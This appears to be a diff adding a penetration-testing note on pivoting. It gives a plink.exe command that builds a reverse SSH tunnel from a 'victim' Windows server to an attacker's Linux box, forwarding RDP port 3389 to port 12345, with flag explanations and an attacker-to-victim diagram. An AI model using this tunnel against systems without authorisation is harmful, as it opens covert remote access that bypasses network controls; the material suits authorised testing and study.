@@ -1,0 +1,33 @@
+# On Windows	
+plink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389 
+
+# On Kali
+netstat -ano | grep LISTEN 
+rdesktop 192.168.0.1:12345 
+
+Options:
+-P - connect to a specific port (“22”, SSH in our case)
+-2 - force use of protocol version 2
+-4 - force use of IPv4
+-T - disable pty allocation
+-N - don’t start a shell/command (SSH-2 only)
+-C - enable compression
+-R - forward remote port to local address. In our case, we will connect to port 12345 and will be forward to 3389
+
+--------------------
+Dump Diagram to Understand What's going on:
+
+Linux Server IP: 192.168.0.1 (ssh open)
+
+Simple:
+Attacker --> Linux Server <============RDP Tunnel Here==============> Victim Windows Server
+
+Advanced:
+Attacker --> (port 12345) Linux Server <==linux port 22============windows port 3389==> Victim Windows Server
+
+Scenario:
+Attacker will connect with RDP to Linux server's 12345 port
+Linux server, 192.168.0.1, TCP port 12345 will forward to port 22
+RDP will travel through tunnel from Linux server's port 22 to Windows server's port 3389
+Windows server listens on port 3389 RDP
+
